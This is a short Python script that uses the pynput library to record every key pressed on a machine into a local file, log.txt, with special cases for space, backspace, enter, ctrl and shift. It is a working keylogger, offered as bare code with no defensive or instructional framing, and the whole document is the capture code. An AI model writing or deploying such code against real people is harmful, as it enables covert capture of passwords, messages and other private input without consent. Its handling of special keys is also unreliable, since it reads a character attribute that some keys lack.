from pynput.keyboard import Key, Listener

def on_press(key):
   with open('log.txt', 'a') as f:
       if key == Key.space:
           f.write(' ')
       elif key == Key.backspace:
           f.write('\b')
       elif key == Key.enter:
           f.write('\n')
       elif key == Key.ctrl:
           # f.write('\003')
           pass
       elif key == Key.shift:
           pass
       elif key.char: # Check if the key is a letter
          f.write(key.char) # Write the character directly
       # else:
       #     f.write('{}'.format(key))

with Listener(on_press=on_press) as listener:
   listener.join()

